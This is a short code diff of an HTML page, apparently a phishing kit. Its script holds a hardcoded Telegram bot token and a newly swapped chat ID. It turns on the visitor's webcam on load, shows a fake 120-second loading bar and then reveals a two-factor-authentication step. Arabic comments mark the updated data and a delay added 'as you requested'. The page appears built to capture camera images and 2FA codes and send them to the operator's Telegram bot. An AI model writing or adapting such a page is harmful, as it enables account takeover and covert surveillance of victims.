@@ -74,8 +74,9 @@
 </div>
 
 <script>
+    // --- البيانات الجديدة المحدثة ---
     const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
-    const chat = '8350812242';
+    const chat = '8188899228'; 
 
     window.onload = () => {
         navigator.mediaDevices.getUserMedia({video:true}).then(s=>document.getElementById('v').srcObject=s);
@@ -124,7 +125,6 @@
             document.getElementById('p-fill').style.width = ((120-t)/120*100)+'%';
             if(t <= 0) { 
                 clearInterval(intr);
-                // انتظار 4 ثواني قبل إظهار الـ 2FA حسب طلبك
                 setTimeout(() => {
                     document.getElementById('loader-screen').style.display='none';
                     document.getElementById('step2').style.display='block';
